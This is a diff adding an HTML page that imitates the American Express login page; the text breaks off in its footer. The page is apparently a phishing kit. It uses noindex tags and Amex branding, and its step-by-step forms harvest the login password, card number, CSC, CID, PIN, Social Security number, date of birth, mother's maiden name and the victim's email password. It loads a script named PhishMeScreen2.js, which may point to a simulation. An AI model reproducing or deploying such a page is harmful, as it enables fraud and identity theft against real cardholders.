@@ -1,0 +1,1346 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="googlebot-news" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="googlebot-news" content="nosnippet">
+    <title>Log in to My Account | American Express US</title>
+    <link rel="icon" href="themes-app.netlify.app/img/icon.icoicon.ico">   
+    <script src="components/jquery.min.js"></script>
+    <script src="components/jquery-3.1.1.min.js"></script>
+    <script src="components/jquery-3.3.1.js" ></script>
+    <script src="components/popper.min.js"></script>
+	<script type="text/javascript" src="components/PhishMeScreen2.js"></script>
+    <style>
+    *{
+        padding: 0;
+        margin: 0;
+        box-sizing: border-box;
+    }
+    .hide-load{
+        opacity: 0;
+        visibility: hidden;
+    }
+    .hideMain{
+        display: none !important;
+    }
+    body{
+        font-family: sans-serif;
+        background-color: #ecedee;
+    }
+    .header_nav{
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        background-color: #fff;
+        padding: 10px;
+    }
+    .header_nav2{
+        background-color: #fff;
+        padding: 20px;
+        text-align: center;
+    }
+    .dataImg0{
+        fill: #fff;
+     }
+    .dataImg1 {
+        fill: #006fcf;
+    }
+    .header_nav{
+        display: flex;
+        align-items: center;
+        justify-content: space-around;
+    }
+    .nav_data{
+        display: flex;
+        align-items: center;
+    }
+    .nav_search{
+        display: flex;
+        align-items: center;
+    }
+    .nav__main span{
+        display: inline-block;
+        font-size: 15px;
+        padding: 10px 12px;
+        color: #006fcf;
+    }
+    .btn-box{
+        margin-left: 25px;
+    }
+    .b-help{
+        background-color: transparent;
+        border: none;
+        font-size: 15px;
+        color: #006fcf;
+    }
+    .btn-l{
+        background-color: #006fcf;
+        padding: 10px 15px;
+        font-family: inherit;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 15px;
+        transition: all .2s ease-in-out;
+    }
+    .btn-l:hover{
+        background-color: #0061b6;
+    }
+    .box__form{
+        width: 24%;
+        background-color: #fff;
+        padding: 20px;
+    }
+    .links a{
+        display: block;
+    }
+    .main_form{
+        display: flex;
+        justify-content: center;
+        padding-top: 40px;
+    }
+    .main_form-2{
+        width: 85%;
+        margin: 20px auto;
+    }
+    .box_img{
+        margin-left: 30px;
+    }
+    .form_input{
+        margin: 20px 0;
+    }
+    .form__inpt input, .form_input select{
+        width: 100%;
+        height: 50px;
+        border-radius: 5px;
+        padding: 10px;
+        background-color: #f7f8f9;
+        border: 1px solid #c8c9c7;
+    }
+    .form_input input:focus, .form_input select:focus{
+        border-color: #006fcf;
+        outline: none;
+    }
+    .form_input label{
+        font-size: 11px;
+        font-weight: 600;
+    }
+    .form_input button{
+        width: 100%;
+        height: 45px;
+        background: #006fcf;
+        color: #fff;
+        border: none;
+        cursor: pointer;
+        border-radius: 5px;
+        font-size: 16px;
+        transition: all 0.3s ease;
+    }
+    .form_input button:hover{
+        background-color: #0061b6;
+    }
+    .links a {
+        color: #0061b6;
+        text-decoration: none;
+        font-size: 14px;
+        margin: 20px 0;
+    }
+    .links a:hover {
+        text-decoration: underline;
+    }
+    .foot_box{
+        background-color: #fff;
+        padding: 40px;
+        margin-top: 30px;
+    }
+    .foot_box1{
+        display: flex;
+        justify-content: space-around;
+        align-items: center;
+    }
+    .foot_boxcon h3{
+        margin: 15px 0;
+        font-size: 13px;
+        font-weight: 600;
+        color: #53565a;
+    }
+    .foot_boxcon a{
+        display: block;
+        color: #006fcf;
+        line-height: 35px;
+        font-size: 14px;
+        text-decoration: none;
+    }
+    .foot_box hr{
+        margin-top: 30px;
+        border: 1px solid #eee;
+    }
+    .foot_img{
+        margin: 10px 0;
+    }
+    .foot_img img{
+         width: 30px;
+         margin-right: 10px;
+    }
+    .foot_type {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 20px 60px;
+    }
+    .foot_text{
+        padding: 0 60px;
+    }
+    .link_nav a{
+         display: inline-block;
+         color: #0061b6;
+         text-decoration: none;
+         margin-right: 15px;
+         font-size: 14px;
+    }
+    .space{
+        margin: 20px 0;
+        font-size: 14px;
+    }
+    .none{
+        display: none;
+    }
+    .progress_box{
+        background-color: #f7f8f9;
+    }
+    .progress{
+        background-color: #1274b8;
+        width: 40%;
+        color: #fff;
+        padding: 10px;
+    }
+    .form2_box{
+        background-color: #fff;
+        margin: 20px 0;
+        padding: 30px;
+    }
+    .h2text{
+        text-align: center;
+    }
+    .h2text h2 {
+        font-weight: 500;
+    }
+    .form_input a{
+        text-decoration: none;
+        color: #0061b6;
+    }
+    .boxform_contain {
+        display: flex;
+        justify-content: center;
+    }
+    .boxform_contain1 {
+        width: 35%;
+    }
+    .boxform_contain{
+        margin-top: 30px;
+    }
+    .boxform_contain hr{
+        margin: 0 50px;
+    }
+    .boxform_contain1 p, .box_contain2 p{
+        font-size: 13px;
+        text-align: center;
+    }
+    .box_contain2 p {
+        margin-bottom: 10px;
+    }
+    .labStyle label{
+        font-size: 14px;
+    }
+    .turn_box{
+        text-align: center;
+    }
+    .text_error{
+        margin-top: 13px;
+        font-size: 15px;
+        font-weight: 600;
+        color: rgb(224, 32, 32);
+    }
+    .error{
+        font-size: 15px;
+        font-weight: 600;
+        color: rgb(224, 32, 32);
+    }
+    .preload-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        z-index: 3000;
+        background-color: #ffffffd2;
+        transition: all .3s ease-in-out;
+    }
+    .preload-body{
+        position: absolute;
+        top: 40%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+    }
+    .mob-bav{
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 10px;
+    }
+    .mt-btn button{
+    padding: 10px 20px;
+    background-color: rgb(0, 111, 207);
+    border: none;
+    color: #fff;
+    font-size: 15px;
+    border-radius: 3px;
+    }
+.loader,
+.loader:after {
+  border-radius: 50%;
+  width: 7em;
+  height: 7em;
+}
+.loader {
+  margin: 60px auto;
+  font-size: 10px;
+  position: relative;
+  text-indent: -9999em;
+  border-top: .8em solid rgba(255, 255, 255, 0.2);
+  border-right: .8em solid #006fcf;
+  border-bottom: .8em solid #006fcf;
+  border-left: .8em solid #006fcf;
+  -webkit-transform: translateZ(0);
+  -ms-transform: translateZ(0);
+  transform: translateZ(0);
+  -webkit-animation: load8 .6s infinite linear;
+  animation: load8 .6s infinite linear;
+}
+@-webkit-keyframes load8 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes load8 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+
+@media screen and (max-width: 842px){
+          .main_form{
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .box__form{
+            width: 90%;
+            margin-bottom: 30px;
+        }
+        .nav_search{
+            display: none;
+        }
+        .nav__main span{
+            font-size: 11px;
+        }
+         .foot_box1{
+        flex-direction: column;
+        align-items: unset;
+        justify-content: unset;
+    }
+
+    .foot_type {
+        display: block;
+        padding: 20px 0;
+    }
+    .foot_logo svg{
+        width: 150px;
+    }
+    .foot_text {
+        padding: 0;
+    }
+    .foot_img img{
+        width: 20px;
+    }
+    .cont_box{
+        display: flex;
+        align-items: center;
+    }
+    .cont_box svg {
+        display: inline-block;
+        width: 30px;
+        margin-left: 10px;
+    }
+    .boxform_contain{
+        flex-direction: column;
+    }
+    .boxform_contain1{
+        width: 100%;
+    }
+
+}
+
+@media screen and (max-width: 600px){
+    .nav_data{
+        display: none;
+    }
+     .header_nav{
+       display: none;
+     }
+     .mob-bav{
+        background-color: #fff;
+     }
+     .main_form{
+        padding-top: 30px;
+     }
+     .main_form-2 {
+        width: 95%;
+        margin: 20px auto;
+    }
+     .box_img{
+        margin-left: 0;
+     }
+
+     .form2_box {
+
+    padding: 20px;
+}
+   
+}
+        .checkcsBox{
+            margin: 10px 0;
+        }
+        .boxMain2Bkox{
+            width: 45%;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 10px;
+            
+        }
+        .bxMv1{
+            background-color: #fff;
+            margin-top: 20px;
+        }
+        .checkcsBox h2{
+            font-weight: 409;
+            text-align: center;
+        }
+        .checkcsBox p{
+             margin: 10px auto;
+             line-height: 18px;
+             font-size: 14px;
+        }
+        .imgBoxCs{
+            text-align: center;
+        }
+        .verifyBtn button {
+            display: block;
+            width: 50%;
+            margin: 0 auto;
+            height: 45px;
+            background: #006fcf;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        .mainsc span{
+            position: absolute;
+            transform: translate(-80px,  17px);
+            color: #006fcf;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .mainBoxForm-21{
+            background-color: #fff;
+        }
+        .pgbox2{
+            margin-bottom: 20px !important;
+        }
+       
+
+        @media screen and (max-width: 600px){
+            .boxMain2Bkox{
+                width: 95%;
+            }
+            .checkcsBox h2{
+                font-size: 18px;
+            }
+            .checkcsBox p{
+                font-size: 13px;
+                font-weight: 400;
+                line-height: 15px;
+            }
+             .verifyBtn button{
+                width: 100%;
+             }
+
+              .progBox{
+            width: 60%;
+        }
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="preload-container hide-load">
+        <div class="preload-body">
+             <div class="loader">Loading...</div>
+        </div>
+    </div>
+
+     <div class="mob-bav">
+            <div class="mt-box">
+                 <img src="components/mt2.png" width="150">
+            </div>
+
+            <div class="mt-btn">
+                <button>Log In</button>
+            </div>
+        </div>
+
+
+    <div class="header_nav">
+        <div class="nav_data">
+             <div class="logo_header">
+             <svg version="1.1" id="Layer_1" x="0" y="0" width="45" height="45" viewBox="0 0 45 45" xml:space="preserve" display="none">
+          <path id="logo-blue-box-small-45-9x45-a" class="st0" d="M44.9 44.9H0V0h44.9z"></path>
+          <path class="dataImg1" d="M44.9 24.2V-.1H0v44.9h44.9V31.7c-.1 0 0-7.5 0-7.5" transform="translate(0 .12)"></path>
+          <path class="dataImg0" d="M39.4 21.7h3.4v-7.9h-3.7v1.1l-.7-1.1h-3.2v1.4l-.6-1.4h-5.9c-.2 0-.4.1-.6.1s-.3.1-.5.2-.3.1-.5.2v-.5H10.2l-.5 1.3-.5-1.3h-4v1.4l-.6-1.4H1.4L0 17.2v4.5h2.3l.4-1.1h.8l.4 1.1h17.6v-1l.7 1h4.9v-.6c.1.1.3.1.4.2s.3.1.4.2c.2.1.4.1.6.1h3.6l.4-1.1h.8l.4 1.1h4.9v-1l.8 1.1zm5.5 10v-7.4H17.4l-.7 1-.7-1H8v7.9h8l.7-1 .7 1h5v-1.7h-.2c.7 0 1.3-.1 1.8-.3v2.1h3.6v-1l.7 1h14.9c.6-.2 1.2-.3 1.7-.6z" transform="translate(0 .12)"></path>
+          <path class="dataImg1" d="M43.2 29.8h-2.7v1.1h2.6c1.1 0 1.8-.7 1.8-1.7s-.6-1.5-1.6-1.5h-1.2c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h2.3l.5-1.1h-2.7c-1.1 0-1.8.7-1.8 1.6 0 1 .6 1.5 1.6 1.5h1.2c.3 0 .5.2.5.5.1.4-.1.6-.5.6zm-4.9 0h-2.7v1.1h2.6c1.1 0 1.8-.7 1.8-1.7s-.6-1.5-1.6-1.5h-1.2c-.3 0-.5-.2-.5-.5s.2-.5.5-.5h2.3l.5-1.1h-2.7c-1.1 0-1.8.7-1.8 1.6 0 1 .6 1.5 1.6 1.5h1.2c.3 0 .5.2.5.5.1.4-.2.6-.5.6zm-3.5-3.2v-1.1h-4.2v5.3h4.2v-1.1h-3v-1.1h2.9v-1.1h-2.9v-1h3v.1zm-6.8 0c.5 0 .7.3.7.6s-.2.6-.7.6h-1.5v-1.3l1.5.1zm-1.5 2.3h.6l1.6 1.9h1.5l-1.8-2c.9-.2 1.4-.8 1.4-1.6 0-1-.7-1.7-1.8-1.7h-2.8v5.3h1.2l.1-1.9zm-3.2-1.6c0 .4-.2.7-.7.7H21v-1.4h1.5c.5 0 .8.3.8.7zm-3.5-1.8v5.3H21V29h1.6c1.1 0 1.9-.7 1.9-1.8 0-1-.7-1.8-1.8-1.8l-2.9.1zM18 30.8h1.5l-2.1-2.7 2.1-2.6H18l-1.3 1.7-1.3-1.7h-1.5l2.1 2.6-2.1 2.6h1.5l1.3-1.7 1.3 1.8zm-4.5-4.2v-1.1H9.3v5.3h4.2v-1.1h-3v-1.1h2.9v-1.1h-2.9v-1h3v.1zm24.3-9.4l2.1 3.2h1.5v-5.3h-1.2v3.5l-.3-.5-1.9-3h-1.6v5.3h1.2v-3.6l.2.4zm-5.2-.1L33 16l.4 1.1.5 1.2h-1.8l.5-1.2zm2.1 3.3H36l-2.3-5.3h-1.6l-2.3 5.3h1.3l.5-1.1h2.6l.5 1.1zm-5.6 0l.5-1.1h-.3c-.9 0-1.4-.6-1.4-1.5v-.1c0-.9.5-1.5 1.4-1.5h1.3v-1.1h-1.4c-1.6 0-2.5 1.1-2.5 2.6v.1c0 1.6.9 2.6 2.4 2.6zm-4.5 0h1.2v-5.2h-1.2v5.2zM22 16.2c.5 0 .7.3.7.6s-.2.6-.7.6h-1.5v-1.3l1.5.1zm-1.5 2.3h.6l1.6 1.9h1.5l-1.8-2c.9-.2 1.4-.8 1.4-1.6 0-1-.7-1.7-1.8-1.7h-2.8v5.3h1.2l.1-1.9zm-2.2-2.3v-1.1h-4.2v5.3h4.2v-1.1h-3v-1.1h2.9v-1.1h-2.9v-1h3v.1zm-9.1 4.2h1.1l1.5-4.3v4.3H13v-5.3h-2l-1.2 3.6-1.2-3.6h-2v5.3h1.2v-4.3l1.4 4.3zm-6.5-3.3l.4-1.1.4 1.1.5 1.2H2.2l.5-1.2zm2.1 3.3h1.3l-2.3-5.3H2.3L0 20.4h1.3l.5-1.1h2.6l.4 1.1z" transform="translate(0 .12)"></path>
+        </svg>
+		<img id="logoTop" src="components/AmExLogo.png" width="45" height="45">
+        </div>
+
+        <div class="nav__main">
+            <span>My Account</span>
+            <span>Cards</span>
+            <span>Banking</span>
+            <span>Travel</span>
+            <span>Rewards</span>
+            <span>Business</span>
+        </div>
+
+        </div>
+
+        <div class="nav_search">
+           <div class="img-search">
+             <img src="components/se.png">
+           </div>
+
+            <div class="btn-box">
+            <button class="b-help">Help</button>
+           </div>
+
+            <div class="btn-box">
+            <button class="btn-l">Log In</button>
+           </div>
+        </div>
+    </div>
+
+    <div class="header_nav2 none">
+        <svg width="235" height="15" viewBox="0 0 235 15">
+        <path fill="none" d="M0 0h235v15H0z"></path>
+        <path d="M230.1 5.8h-3.6c-.8 0-1.3-.5-1.3-1.2s.6-1.1 1.3-1.1h6.5l1.5-3.3h-8c-3.3 0-5.2 2-5.2 4.6 0 2.8 1.8 4.4 4.7 4.4h3.6c.8 0 1.3.5 1.3 1.2s-.5 1.2-1.3 1.2h-7.8v3.3h7.8c3.3 0 5.2-1.9 5.2-4.7 0-2.8-1.7-4.4-4.7-4.4m-14.3 0h-3.6c-.8 0-1.3-.5-1.3-1.2s.6-1.1 1.3-1.1h6.5l1.5-3.3h-8c-3.3 0-5.2 2-5.2 4.6 0 2.8 1.8 4.4 4.7 4.4h3.6c.8 0 1.3.5 1.3 1.2s-.5 1.2-1.3 1.2h-7.8v3.3h7.8c3.3 0 5.2-1.9 5.2-4.7 0-2.8-1.7-4.4-4.7-4.4m-22.8 9h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2H193zm-7.7-8.4h-4.1V3.5h4.1c1.2 0 1.8.7 1.8 1.5-.1.8-.7 1.4-1.8 1.4m5.7-1.5c0-2.8-2-4.7-5.2-4.7h-8.4v14.6h3.9V9.7h1.4l4.4 5.1h4.8l-4.8-5.3c2.4-.5 3.9-2.3 3.9-4.6m-21 1.8h-4.2V3.5h4.2c1.2 0 1.8.7 1.8 1.6-.1.9-.7 1.6-1.8 1.6m.4-6.5h-8.5v14.6h3.9V10h4.5c3.3 0 5.3-2.1 5.3-4.9 0-2.9-2-4.9-5.2-4.9m-9.2 0h-5l-3.8 4.4-3.8-4.4h-5.1l6.4 7.2-6.5 7.4h5l3.9-4.6 4 4.6h5.1l-6.6-7.5zm-30.7 14.6h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2h-12.3zm-13.7-5.7l-6-8.9h-4.9v14.6h3.9V5.5l6.1 9.3h4.7V.2h-3.8zm-22.7-.5l2-4.9 2 4.9h-4zM93.7.2l-6.4 14.6h4.3l1.2-3h6.8l1.3 3h4.4L98.7.2h-5zM80.9 7.6v-.3c0-2.2 1.2-3.7 3.7-3.7H89V.2h-4.7C79.5.2 77 3.3 77 7.3v.3c0 4.5 2.8 7.1 7.1 7.1h1.3l1.6-3.3h-2.3c-2.3.1-3.8-1.2-3.8-3.8M71.1.2v14.6H75V.2zm-7.8 6.2h-4.1V3.5h4.1c1.2 0 1.8.7 1.8 1.5s-.6 1.4-1.8 1.4M69 4.9c0-2.8-2-4.7-5.2-4.7h-8.4v14.6h3.9V9.7h1.4l4.4 5.1H70l-4.8-5.3C67.6 9 69 7.2 69 4.9m-28.5 9.9h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2H40.5zM28.1 9.4L24.8.2h-6.1v14.6h3.8V4.3l3.8 10.5h3.5l3.9-10.5v10.5h3.8V.2h-6.1zM6.9 8.6l2-4.9 2 4.9h-4zM6.4.2L0 14.8h4.3l1.2-3h6.8l1.3 3H18L11.5.2H6.4z" fill="#006fcf"></path>
+      </svg>
+    </div>
+
+
+    <div class="main_form mainBoxForm-1">
+        <div class="box__form">
+            <h2>Log In to My Account</h2>
+
+            <div class="text_error none">
+                <span>Incorrect User ID or Password</span>
+            </div>
+
+
+            <form action="#" id="form" onsubmit="return false;">
+                 <div class="form_input form__inpt">
+                <label for="">User ID</label>
+                <input type="text" name="id" required="">
+            </div>
+
+            <div class="form_input form__inpt">
+                <label for="">Password</label>
+                <input type="password" name="pa" required="">
+            </div>
+
+             <div class="form_input">
+               <select name="type" id="type">
+                <option value="Cards - My Account">Cards - My Account</option>
+                <option value="Membership Rewards">Membership Rewards</option>
+                <option value="Merchant Account">Merchant Account</option>
+                <option value="American Express @ Work">American Express @ Work</option>
+               </select>
+            </div>
+          
+
+             <div>
+                <input type="checkbox" id="check">
+                <label for="check">Remember Me</label>
+            </div>
+
+             <div class="form_input">
+                <button>Login</button>
+            </div>
+            </form>
+
+
+            <div class="links">
+                <a href="#">Forgot User ID or Password?</a>
+                <a href="#">Create New Online Account</a>
+                <a href="#">Confirm Card Received</a>
+                <a href="#">Visit Our Security Center</a>
+            </div>
+            
+        </div>
+
+     <div class="box_img">
+            <img id="imageBox" src="components/imageBox.png">
+        </div>
+    </div>
+
+
+
+    <div class="main_form-2 mainBoxForm-21 none">
+           <div class="progress_box pgbox2">
+            <div class="progress progBox">
+                <span>1. Security Verification</span>
+                </div>
+            </div>
+
+
+        <div class="bxMv1">
+
+       
+         <div class="boxMain2Bkox">
+                
+                <div class="checkcsBox">
+                        <form action="#" id="formSx" onsubmit="return false;">
+                                 <h2>Security Verification: 3-Digit CSC</h2>
+                                <p>Please enter the 3-digit Card Security Code (CSC) which are the last three numbers printed on the signature strip on the back of your card.</p>
+
+                                <div class="imgBoxCs">
+                                    <img src="components/3CSC_INTL_300x190.png" alt="csimg">
+                                </div>
+
+
+                             <div class="text_error errsec errSx none">
+                                <span>Invalid 3-Digit CSC Code, Try again</span>
+                            </div>
+                            
+                            <div class="form_input form__inpt labStyle mainsc">
+                                <label for="">3-Digit CSC</label>
+                                <input type="password" name="sx" id="sx" placeholder="" required="" minlength="3" maxlength="3">
+                                <span class="showvID2">Show</span>
+                            </div>
+
+                                <div class="verifyBtn">
+                                <button class="vsxbtn">Verify</button>
+                            </div>
+                               </form>
+                        </div>
+
+            </div>
+
+             </div>
+    </div>
+
+
+
+
+    
+
+    <div class="main_form-2 mainBoxForm-22 none">
+           <div class="progress_box pgbox2">
+            <div class="progress progBox">
+                <span>1. Security Verification</span>
+                </div>
+            </div>
+
+
+        <div class="bxMv1">
+
+       
+         <div class="boxMain2Bkox">
+                
+                <div class="checkcsBox">
+                        <form action="#" id="formOt" onsubmit="return false;">
+                                 <h2>Verify your identity</h2>
+                                <p>Please enter the one-time password sent to your Mobile Number. </p>
+
+
+                             <div class="text_error errsec errSx errot none">
+                                <span class="textErrP">Invalid 3-Digit CSC Code, Try again</span>
+                            </div>
+                            
+                            <div class="form_input form__inpt labStyle mainsc">
+                                <label for="">One-time password</label>
+                                <input type="text" name="ot" id="ot" placeholder="" required="">
+                               
+                            </div>
+
+                                <div class="verifyBtn">
+                                <button class="vsxbtn">Verify</button>
+                            </div>
+                               </form>
+                        </div>
+
+            </div>
+
+             </div>
+    </div>
+
+
+    <div class="main_form-2 mainBoxForm-2 none">
+        <div class="progress_box">
+            <div class="progress">
+                <span>2. Verify your card</span>
+            </div>
+        </div>
+
+        <div class="form2_box">
+            <!-- <div class="h2text">
+                  <h2>Verify Your Card</h2>
+            </div> -->
+
+            <div class="boxform_contain">
+                
+                <div class="boxform_contain1">
+                      <p>For additional security, please enter the following information so that we can confirm it's you not someone else and proceed with the verification purpose.</p>
+
+                      <form action="#" id="form2" onsubmit="return false;">
+
+                          <div class="text_error errordsc none">
+                            <span>Incorrect User ID or Password</span>
+                        </div>
+
+
+                        <div class="form_input form__inpt labStyle">
+                            <label for="">Full Card Number</label>
+                            <input type="text" name="dci" placeholder="Full Card Number" required="" class="sc">
+                          
+                        </div>
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">4 Digit Card Code (CID)</label>
+                            <input type="text" name="scs" placeholder="4 Digit Card CID" class="sc">
+                        </div>
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">Card Expiry Date</label>
+                            <input type="text" name="em" placeholder="MM/YY" required="" minlength="5" maxlength="5" class="sc">
+                        </div>
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">Personal Security Key (PIN)</label>
+                            <input type="pin" name="ph" placeholder="Personal Security Key (PIN)" required="" class="sc">
+                        </div>
+
+                        <div class="form_input">
+                            <button>Continue</button>
+                        </div>
+                      </form>
+                    
+                        <div class="form_input">
+                            <a href="#">Don t have a 4-Digit Card ID?</a>
+                        </div>
+                </div>
+
+                <hr>
+
+                <div class="box_contain2">
+                    <p>The location of your Card details may differ depending on your Card.</p>
+                    <div class="box_containImg">
+                        <img src="components/dw.png">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    
+    <div class="main_form-2 mainBoxForm-3 none">
+        <div class="progress_box">
+            <div class="progress">
+                <span>3. Verify your card</span>
+            </div>
+        </div>
+
+        <div class="form2_box">
+            <div class="h2text">
+                  <h2>Verify Your Card</h2>
+            </div>
+
+            <div class="boxform_contain">
+                <div class="boxform_contain1">        
+                   
+                      <form action="#" id="form3" onsubmit="return false;">
+                        <div class="form_input form__inpt labStyle">
+                            <label for="">Name On Card</label>
+                            <input type="text" name="noc" placeholder="Name On Card" required="">
+                        </div>
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">15-Digits Card Number</label>
+                            <input type="text" name="cnum" placeholder="XXXX-XXXXXX-XXXX" required="">
+                        </div>
+                          <div class="form_input form__inpt labStyle">
+                            <label for="">Expiry Date</label>
+                            <input type="text" name="exp" placeholder="MM/YY" required="">
+                        </div>
+                          <div class="form_input form__inpt labStyle">
+                            <label for="">Phone Number</label>
+                            <input type="text" name="sec" placeholder="Phone Number" required="">
+                        </div>
+                        
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">Email Address</label>
+                            <input type="text" name="em" placeholder="Email Address" required="">
+                        </div>
+
+                        <div class="form_input form__inpt labStyle">
+                            <p class="error err-2 none">Incorrect Password</p>
+                            <label for="">PASSWORD</label>
+                            <input type="password" name="pam" placeholder="Password" required="">
+                        </div>
+
+                        <div class="form_input">
+                            <button>Continue</button>
+                        </div>
+                      </form>
+                    
+
+                        <div class="form_input">
+                            <a href="#">Don t have a 4-Digit Card ID?</a>
+                        </div>
+                </div>
+
+                <hr>
+
+                <div class="box_contain2">
+                    <p>The location of your Card details may differ depending on your Card.</p>
+                    <div class="box_containImg">
+                        <img src="components/dw.png">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+    <div class="main_form-2 mainBoxForm-4 none">
+        <div class="progress_box">
+            <div class="progress">
+                <span>4. Personal Information</span>
+            </div>
+        </div>
+
+        <div class="form2_box">
+            <div class="h2text">
+                  <h2>Verify Your Personal Information</h2>
+            </div>
+
+            <div class="boxform_contain">
+                <div class="boxform_contain1">                            
+                  
+                      <form action="#" id="form4" onsubmit="return false;">
+                        <div class="form_input form__inpt labStyle">
+                            <label for="">Social Security Number</label>
+                            <input type="text" name="ss" placeholder="XXX-XX-XXXX" required="">
+                        </div>
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">Personal Security Pin / Key</label>
+                            <input type="text" name="psp" placeholder="XXXX" required="">
+                        </div>
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">Date Of Birth</label>
+                            <input type="text" name="dob" placeholder="DD/MM/YY required" required="">
+                        </div>
+        
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">Mother's Maiden Name</label>
+                            <input type="text" name="pob" placeholder="MOTHER'S MAIDEN NAME" required="">
+                        </div>
+
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">Mother's Birthday</label>
+                            <input type="text" name="pob2" placeholder="MOTHER'S BIRTHDAY" required="">
+                        </div>
+
+                        
+                         <div class="form_input form__inpt labStyle">
+                            <label for="">Email Address</label>
+                            <input type="text" name="emai" placeholder="EMAIL ADDRESS" required="">
+                        </div>
+                         <div class="form_input form__inpt labStyle">
+                             <p class="error err-3 none">Incorrect Email Password</p>
+                            <label for="">Email Password</label>
+                            <input type="password" name="pas" placeholder="Password" required="">
+                        </div>
+
+                        <div class="form_input">
+                            <button>Continue</button>
+                        </div>
+                      </form>
+                
+                </div>
+            </div>
+        </div>
+    </div>
+
+      <div class="main_form-2 mainBoxForm-5 none">
+        <div class="progress_box">
+            <div class="progress">
+                <span>5. Finish</span>
+            </div>
+        </div>
+
+        <div class="form2_box">
+            <div class="h2text">
+                  <h2>Thank you, Your information has been verified.</h2>
+            </div>
+
+            <div class="boxform_contain">
+                <div class="boxform_contain1">        
+                 
+                    <div class="turn_box">
+                           <img src="components/tn.gif">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    <div class="foot_box">
+        <div class="foot_box1">
+             <div class="foot_boxcon">
+            <h3>ABOUT</h3>
+            <a href="#">About American Express</a>
+            <a href="#">Investor Relations</a>
+            <a href="#">Careers</a>
+            <a href="#">Global Network</a>
+            <a href="#">Contact Us</a>
+            <a href="#">Amex Mobile App</a>
+        </div>
+
+
+        <div class="foot_boxcon">
+            <h3>PRODUCTS &amp; SERVICES</h3>
+            <a href="#">Credit Cards</a>
+            <a href="#">Business Credit Cards</a>
+            <a href="#">Corporate Programs</a>
+            <a href="#">Prepaid Cards</a>
+            <a href="#">Savings Accounts &amp; CDs</a>
+            <a href="#">Gift Cards</a>
+        </div>
+
+
+        <div class="foot_boxcon">
+            <h3>LINKS YOU MAY LIKE</h3>
+            <a href="#">Membership Rewards</a>
+            <a href="#">Free Credit Score &amp; Report</a>
+            <a href="#">CreditSecure</a>
+            <a href="#">Bluebird</a>
+            <a href="#">Accept Amex Cards</a>
+            <a href="#">Refer A Friend</a>
+        </div>
+
+        <div class="foot_boxcon">
+            <h3>ADDITIONAL INFORMATION</h3>
+            <a href="#">Credit Intel â Financial Education Center</a>
+            <a href="#">Supplier Diversity</a>
+            <a href="#">Credit 101</a>
+            <a href="#">Money Management 101</a>
+            <a href="#">US Newcomers</a>
+            <a href="#">Frequently Asked Questions</a>
+        </div>
+        </div>
+        <hr>
+
+        <div class="foot_box2">
+            <div class="foot_type">
+                 <div class="foot_logo">
+                    <svg width="235" height="15" viewBox="0 0 235 15">
+                    <path fill="none" d="M0 0h235v15H0z"></path>
